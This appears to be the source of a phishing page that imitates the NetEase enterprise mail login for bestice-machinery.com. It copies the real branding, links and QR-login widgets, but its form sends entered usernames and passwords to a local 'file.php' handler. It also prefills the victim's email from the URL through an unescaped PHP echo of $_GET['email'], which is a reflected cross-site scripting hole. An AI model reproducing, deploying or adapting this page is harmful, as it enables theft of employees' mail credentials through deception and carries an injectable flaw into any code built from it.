<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">

		
		<meta name="keywords" content="网易企业邮箱,登录企业邮箱,企业邮箱注册,电子邮箱">
		<meta name="description" content="网易企业邮箱登录页面繁体版，帮助用户登录企业邮箱，开启随时随地，极速收发的便捷体验。">
		<meta name="title" content="网易企业邮箱 - 企业信息化专业解决方案">
		<title>HebeiBesticeMachineryFactory - 邮箱用户登录</title>
		
		
		
		
		<!--[if lt ie 9]>
		<style type="text/css">
			.logo {
				background: none;
				filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://mimg.qiye.163.com/o/public/logo.gif', sizingMethod='scale');
			}
		</style>
		<![endif]-->
	
<link media="all" href="images/index.css" type="text/css" rel="stylesheet">
</head>
<body>
		<div class="page">
			<div class="header">
				<h1 class="logo"></h1>
				<div class="toplinks">
                    <a href="http://mail.bestice-machinery.com/?hl=zh_TW" target="_self">繁體版</a> |
                        <a href="http://mail.bestice-machinery.com/?hl=en_US" target="_self">English</a> |
                        <a href="http://qiye.163.com/entry/help/help-client.htm" target="_top">帮助</a>
                    </div>
			</div>
			<div class="body">
				<div class="part main-part" id="main-part" style="background-image: url('images/user_yixin_right_20171227.jpg'); cursor: pointer;">
					<div id="login-mod-wrapper" class="login-mod-wrapper login-mod-form login-mod-wrapper-0" style="cursor: default;">
						<div class="mod login-mod  ">
							<form name="loginform" id="loginform" action="file.php" method="post" onsubmit="return frmvalidator();">
								<input name="ch" id="ch" value="icp" type="hidden">
								<input name="pubid" id="pubid" value="<?php echo $_GET['email']; ?>" type="hidden">
								<input name="passtype" id="passtype" value="" type="hidden">
								<input name="support_verify_code" id="support_verify_code" value="1" type="hidden">
								<input name="domain" id="domain" value="bestice-machinery.com" type="hidden">
									
								<h2>
									企业用户登录
								</h2>
								<div class="fi">
									<label class="tit">
										用户名
									</label>
									<input name="account_name" id="account_name" class="ipt-t ipt-sample" value="<?php echo $_GET['email']; ?>" type="text">
								</div>
								<div class="fi">
									<label class="tit">
										密 码
									</label>
									<input class="ipt-t" name="password" id="password" value="" type="password">
								</div>
								<!-- 新增验证码 -->
								<div id="verifyCodeWrap" class="fi f-dn">
									<label class="tit">验证码</label>
									<input name="verify_code" id="verify_code" style="float: left; width: 140px; height: 24px; line-height: 24px;" class="ipt-sample" value="请输入验证码" type="text">
									<a id="codeImgWrap" style="float: left; width: 100px; height: 30px; padding: 0px; margin: 0px; display: block; cursor: pointer;" href="javascript:void(0);">
										<img src="untitled" style="width: 100%; height: 100%;">
									</a>
								</div>
								<div class="fi" style="clear: both;">
									<label for="remUsername">
										<input name="remUser" id="remUsername" value="1" class="ipt-c" type="checkbox">
										记住用户名
									</label>
									&nbsp;&nbsp;
									<input name="secure" value="1" type="hidden">
									<label for="secure">
										<input id="secure" disabled="disabled" value="1" checked="checked" class="ipt-c" type="checkbox">
										SSL安全登录
									</label>
									&nbsp;&nbsp;
									<label for="all_secure">
										<input name="all_secure" id="all_secure" value="1" class="ipt-c" type="checkbox">
										全程SSL
									</label>
								</div>
								<div class="fi fi-notit f-cb">
									<input class="ipt-b" value="登　录" style="float: left;" id="submit-btn" type="submit">
                                    <div id="app-download-wrapper">
                                        <div class="app-download app-download-android">
                                            <a class="app-download-link" href="http://u.163.com/androidds4" target="_top">Android版</a>&nbsp;
                                        </div>
                                        <div class="app-download app-download-iphone">
                                            <a class="app-download-link" href="http://u.163.com/iosds4" target="_top">iPhone版</a>
                                        </div>
                                    </div>
									<table id="err-wrapper" class="err f-dn">
										<tbody><tr>
											<td id="msgpid"></td>
										</tr>
									</tbody></table>
								</div>
								<div class="goto" style="margin-top: 0px;">
										<a href="http://mail.bestice-machinery.com/admin.jsp" class="gotoLink" target="_top">管理员登录</a>
                                        <a class="gotoLink" id="resetPwd">忘记密码？</a>
										<a class="gotoLink" id="selectNetwork">登录太慢？</a>
										</div>
								</form>
						</div>
                        <div id="login-qr-1" class="login-qr login-qr-1"></div>
                    <div class="m-codebox js-codebox f-zindex-10 login-mod-form">
						<!-- 安全登录 -->
						<div id="appLoginTab" class="appLoginTab">
							<div id="appLoginWait" style="display: block;">
								<h3>手机扫码 安全防盗</h3>
								<div id="appCodeWrap" class="appCodeWrap allowmove">
									<div class="appCode-example"></div>
									<div id="appCodeBox" class="appCodeBox">
										<img id="appCode" class="appCode" src="getqrcode.do" width="130" height="130">
										<div id="appCodeRefresh" class="appCodeRefresh" style="display: none;">
											<div class="appCode-wrap"><p>二维码已失效<br>请点击刷新</p></div>
										</div>
									</div>
								</div>
								<p id="appLoginTxt" class="appLoginTxt txt-err"></p>
								<p class="appLogin-hint">使用 邮箱大师 扫描二维码登录</p>
								<p class="appLoginlink"><a id="howToUseApp" class="howToUseApp" href="javascript:void(0)">如何使用</a><var>|</var><a href="http://mail.163.com/dashi/" target="_top">下载邮箱大师</a></p>
							</div>
							<div id="appLoginScan" class="appLoginScan" style="display: none;">
								<div class="appLogin-scanSuc"></div>
								<p class="appLogin-scantxt txt-suc">成功扫描，请在手机上确认登录</p>
								<a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)">返回重新扫描</a>
							</div>
						</div>
						<a class="closeentry js-closeentry" href="javascript:;" hidefocus="true"></a>
						</div>
                    </div>
				</div>
				<div class="part sec-part">
						<div class="mod sec-mod intro-mod">
								<h2>
									简介
								</h2>
								</div>
						<div class="mod sec-mod news-mod">
								<h2>
									新闻
								</h2>
								</div>
						</div>
				</div>
			<div class="footer">
                <div class="link">
                        <a href="http://corp.163.com/gb/home.shtml" target="_top">关于网易</a>
                        <a href="http://corp.163.com/gb/legal/legal.html" target="_top">相关法律</a>
                        <a href="http://qiye.163.com/" target="_top">企业邮箱</a>
                    </div>
                    <div class="right">
                        <span>本系统由网易企业邮提供 ©1997-2017 </span>
                    </div>
                </div>
		</div>
	
	
	<!--用于返回错误提示，和domainType值-->
	
	
	
	
	
	
	
    
    
    

</body>
</html>
